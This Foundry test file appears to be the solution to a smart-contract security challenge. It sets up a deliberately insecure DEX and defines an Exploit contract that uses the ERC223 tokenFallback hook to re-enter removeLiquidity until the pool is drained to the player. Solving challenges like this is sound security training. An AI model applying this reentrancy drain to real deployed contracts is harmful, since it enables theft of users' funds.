// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "forge-std/console2.sol";
import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";

import {SimpleERC223Token} from "../src/tokens/tokenERC223.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";

contract Challenge2Test is Test {
    InsecureDexLP private target;
    IERC20 private token0;
    IERC20 private token1;

    address private player = makeAddr("player");

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        token0 = IERC20(new InSecureumToken(10 ether));
        token1 = IERC20(new SimpleERC223Token(10 ether));

        target = new InsecureDexLP(address(token0), address(token1));

        token0.approve(address(target), type(uint256).max);
        token1.approve(address(target), type(uint256).max);
        target.addLiquidity(9 ether, 9 ether);

        token0.transfer(player, 1 ether);
        token1.transfer(player, 1 ether);

        vm.stopPrank();

        vm.label(address(target), "DEX");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "SimpleERC223Token");
    }

    function testChallenge() public {
        vm.startPrank(player);

        Exploit attacker = new Exploit(
            address(token0),
            address(token1),
            address(target),
            player
        );

        token0.transfer(address(attacker), token0.balanceOf(player));
        token1.transfer(address(attacker), token1.balanceOf(player));

        attacker.attack();

        vm.stopPrank();

        assertEq(
            token0.balanceOf(player),
            10 ether,
            "Player should have 10 ether of token0"
        );
        assertEq(
            token1.balanceOf(player),
            10 ether,
            "Player should have 10 ether of token1"
        );
        assertEq(
            token0.balanceOf(address(target)),
            0,
            "Dex should be empty (token0)"
        );
        assertEq(
            token1.balanceOf(address(target)),
            0,
            "Dex should be empty (token1)"
        );
    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit {
    IERC20 public token0; // this is insecureumToken
    IERC20 public token1; // this is simpleERC223Token
    InsecureDexLP public dex;
    address private player;

    constructor(
        address _token0,
        address _token1,
        address _dex,
        address _player
    ) {
        token0 = InSecureumToken(_token0);
        token1 = SimpleERC223Token(_token1);
        dex = InsecureDexLP(_dex);
        player = _player;
    }

    function attack() external {
        token0.approve(address(dex), type(uint256).max);
        token1.approve(address(dex), type(uint256).max);

        dex.addLiquidity(
            token0.balanceOf(address(this)),
            token1.balanceOf(address(this))
        );

        dex.removeLiquidity(dex.balanceOf(address(this)));
    }

    function tokenFallback(
        address,
        uint256,
        bytes calldata
    ) external {
        uint256 token0Balance = token0.balanceOf(address(this));
        // add liquidity call
        uint256 token1Balance = token1.balanceOf(address(this));
        if (token0Balance == 0 && token1Balance == 0) {
            return;
        }

        uint256 dexToken0Balance = token0.balanceOf(address(dex));
        uint256 dexToken1Balance = token1.balanceOf(address(dex));
        // transfer all tokens to player
        if (dexToken0Balance == 0 && dexToken1Balance == 0) {
            token0.transfer(player, token0Balance);
            token1.transfer(player, token1Balance);
            return;
        }

        // removeLiquidity reentrancy
        uint256 dexBalance = dex.balanceOf(address(this));
        try dex.removeLiquidity(dexBalance) {} catch {}
    }
}
